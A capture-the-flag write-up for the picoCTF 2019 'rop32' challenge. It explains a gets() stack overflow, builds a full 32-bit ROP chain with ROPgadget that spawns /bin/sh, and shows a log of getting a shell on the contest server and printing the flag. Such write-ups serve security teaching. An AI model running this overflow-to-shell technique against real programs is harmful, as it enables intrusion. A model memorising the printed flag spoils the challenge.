# picoctf2019 rop32

##### As the given hint of this problem, this is a ROP + getshell challenge 
https://2019game.picoctf.com/problems
- vuln
- vuln.c
 ### Exploitation
We can see that both NX and ALSR are enabled, so we can only use ROP to bypass.
```sh
nmlab@nmlab-VirtualBox:~/Desktop$ checksec vuln
[*] '/home/nmlab/Desktop/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```
First view the source code and run the program, it is clear that the gets() function causes overflow.
```sh
nmlab@nmlab-VirtualBox:~/Desktop$ ./vuln
Can you ROP your way out of this one?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
We want to create a ROP chain to execute /bin/sh, first use the ROPgadget to find all the gadgets. In this challenge we can use the ROPgadget to create a ROP chain using the command :
```
ROPgadget --binary ./vuln  --ropchain --badbytes 0a
```
Note that the argument "--badbytes 0a" is added because if the gets function receives a buffer with a newline, \n, or 0xa in ASCII, it ignores everything after it, so we have to get a payload without any newline character or else our ROP exploit will fail

After generating the ROP chain, we need to add the padding, since the buffer size is 16, the padding will be 28, or we can just simply use gdb to find the overflow offset, the payload is padding plus the ROP chain. The final step is to send the payload and get shell.
```python
def rop():
    # ROPgadget --binary ./vuln  --ropchain --badbytes 0a
    
    p = 'A'*(28) # overflow offset
    
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '/bin'
    p += pack('<I', 0x080da060) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da064) # @ .data + 4
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '//sh'
    p += pack('<I', 0x080da064) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x080da060) # padding without overwrite ebx
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x08049563) # int 0x80

    return p
```
```python
payload = rop()
print payload
print s.recvuntil('?')
s.sendline(payload)
s.interactive()
```
Now we run the exploit script
```sh
Yende-MBP:desktop yenmeng$ python rop32.py 
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] yyymmm@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[*] Working directory: '/problems/rop32_1_c4f09c419e5910665553c0237de93dcf'
[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 711365
payload:  AAAAAAAAAAAAAAAAAAAAAAAAAAAAk`\xa04c\x05/bin`\xa0AAAAen\x05kd\xa04c\x05//shd\xa0AAAAen\x05kh\xa0 d\x05en\x05Ɂ\x04`\xa0\x92h\xa0`\xa0kh\xa0 d\x05????c\x95\x04
Can you ROP your way out of this one?
[*] Switching to interactive mode

$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{rOp_t0_b1n_sH_b6597626}$ $  
```
